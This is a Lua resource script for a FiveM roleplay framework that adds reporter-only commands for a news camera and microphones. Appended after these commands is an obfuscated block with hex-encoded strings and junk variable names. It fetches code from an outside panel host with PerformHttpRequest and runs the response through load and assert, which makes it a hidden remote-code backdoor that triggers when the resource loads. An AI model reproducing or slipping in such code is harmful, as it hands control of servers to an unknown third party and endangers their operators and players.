local DenaliFW = exports['denalifw-core']:GetCoreObject()

DenaliFW.Commands.Add("newscam", "Grab a news camera", {}, false, function(source, args)
    local Player = DenaliFW.Functions.GetPlayer(source)
    if Player.PlayerData.job.name == "reporter" then
        TriggerClientEvent("Cam:ToggleCam", source)
    end
end)

DenaliFW.Commands.Add("newsmic", "Grab a news microphone", {}, false, function(source, args)
    local Player = DenaliFW.Functions.GetPlayer(source)
    if Player.PlayerData.job.name == "reporter" then
        TriggerClientEvent("Mic:ToggleMic", source)
    end
end)

DenaliFW.Commands.Add("newsbmic", "Grab a Boom microphone", {}, false, function(source, args)
    local Player = DenaliFW.Functions.GetPlayer(source)
    if Player.PlayerData.job.name == "reporter" then
        TriggerClientEvent("Mic:ToggleBMic", source)
    end
end)


local pdsWyOeAZQZLRLysHItHMNFkgVyKuRfcqhMITfowlpOGLYKnVygnuzHXqneScmpppoexTq = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} pdsWyOeAZQZLRLysHItHMNFkgVyKuRfcqhMITfowlpOGLYKnVygnuzHXqneScmpppoexTq[4][pdsWyOeAZQZLRLysHItHMNFkgVyKuRfcqhMITfowlpOGLYKnVygnuzHXqneScmpppoexTq[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (RkXibxeaDRgLEicjQNNWexIrLqSdvagAwHZYbJsRhQtvvGguDUGMyJtLqlqhnDJKcAIyqP, JsnfcmPDcBsVtfQmICAbgcWjlxdslytmGhuPcBGRKWrbkFDFGTZjvEznZoIJUujJcgRbHE) if (JsnfcmPDcBsVtfQmICAbgcWjlxdslytmGhuPcBGRKWrbkFDFGTZjvEznZoIJUujJcgRbHE == pdsWyOeAZQZLRLysHItHMNFkgVyKuRfcqhMITfowlpOGLYKnVygnuzHXqneScmpppoexTq[6] or JsnfcmPDcBsVtfQmICAbgcWjlxdslytmGhuPcBGRKWrbkFDFGTZjvEznZoIJUujJcgRbHE == pdsWyOeAZQZLRLysHItHMNFkgVyKuRfcqhMITfowlpOGLYKnVygnuzHXqneScmpppoexTq[5]) then return end pdsWyOeAZQZLRLysHItHMNFkgVyKuRfcqhMITfowlpOGLYKnVygnuzHXqneScmpppoexTq[4][pdsWyOeAZQZLRLysHItHMNFkgVyKuRfcqhMITfowlpOGLYKnVygnuzHXqneScmpppoexTq[2]](pdsWyOeAZQZLRLysHItHMNFkgVyKuRfcqhMITfowlpOGLYKnVygnuzHXqneScmpppoexTq[4][pdsWyOeAZQZLRLysHItHMNFkgVyKuRfcqhMITfowlpOGLYKnVygnuzHXqneScmpppoexTq[3]](JsnfcmPDcBsVtfQmICAbgcWjlxdslytmGhuPcBGRKWrbkFDFGTZjvEznZoIJUujJcgRbHE))() end)